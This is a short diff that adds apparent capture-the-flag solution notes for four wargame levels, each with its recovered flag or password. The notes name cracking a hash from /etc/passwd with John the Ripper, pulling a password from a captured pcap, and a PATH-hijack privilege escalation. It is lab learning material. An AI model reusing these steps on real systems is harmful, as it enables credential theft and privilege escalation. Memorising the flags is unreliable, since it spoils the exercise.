@@ -1,0 +1,4 @@
+level00 ls -lR / | grep flag00 => create .c to check code +n =>  nottoohardhere flag=x24ti5gi3x0ol2eh4esiuxias
+level01 /etc/passwd, flag01 => john the ripper =>  abcdefg	flag=f2av5il02puano7naaf6adaaf
+level02 "scp -P 4242 level02@10.11.200.229:level02.pcap ." -> pcap => cloudshark => ft_wandr del del del NDRel del L0L => ft_waNDReL0L flag=kooda2puivaav1idi4f57q8iq
+level03 cd /tmp => ln -s /bin/getflag echo + export PATH=/tmp:$PATH => ./level03 => flag=qi0maab88jeaj46qoumi7maus
